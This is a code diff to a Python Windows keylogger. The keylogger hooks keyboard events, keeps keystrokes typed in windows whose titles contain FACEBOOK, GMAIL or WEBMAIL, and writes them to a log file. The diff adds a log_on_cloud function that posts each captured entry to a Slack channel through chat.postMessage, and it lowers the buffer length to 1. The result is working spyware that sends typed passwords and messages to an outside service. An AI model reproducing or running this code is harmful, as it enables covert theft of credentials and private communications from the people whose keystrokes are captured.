@@ -5,13 +5,18 @@ import logging
 import win32event, win32api, winerror, win32gui
 import queue
 from datetime import datetime
+from slackclient import SlackClient
 from winreg import *
 
+# Slack link:
+
+# File info
 FILE = 'logfile.log'
 data = ''
-max_length = 10
+max_length = 1
 
-key_words = ['FACEBOOK', 'GMAIL']
+# Keywords for algorithm
+key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']
 
 #todo :
 # algorithm using event.WindowName 
@@ -37,7 +42,8 @@ def on_keyboard(event):
 						'data': data}
 				log = "{d[datum]} :: {d[WindowName]} :: {d[data]} \n".format(d=log_info)
 				data = ''
-				do_log(FILE, log)
+				log_on_file(FILE, log)
+				log_on_cloud(slack_client, log)
 		return True
 	except:
 		return False
@@ -50,10 +56,16 @@ def is_relevant(WindowName, key_words):
 			res = True
 	return res
 
-def do_log(file, data):
+def log_on_file(file, data):
 	# append the input data in the log file
 	with open(file, 'a') as f:
 		f.write(data)
+
+def log_on_cloud(client, data):
+	client.api_call(
+		"chat.postMessage",
+		channel=channel,
+		text=data)
 
 if __name__ == '__main__':
 	hm = pyHook.HookManager()
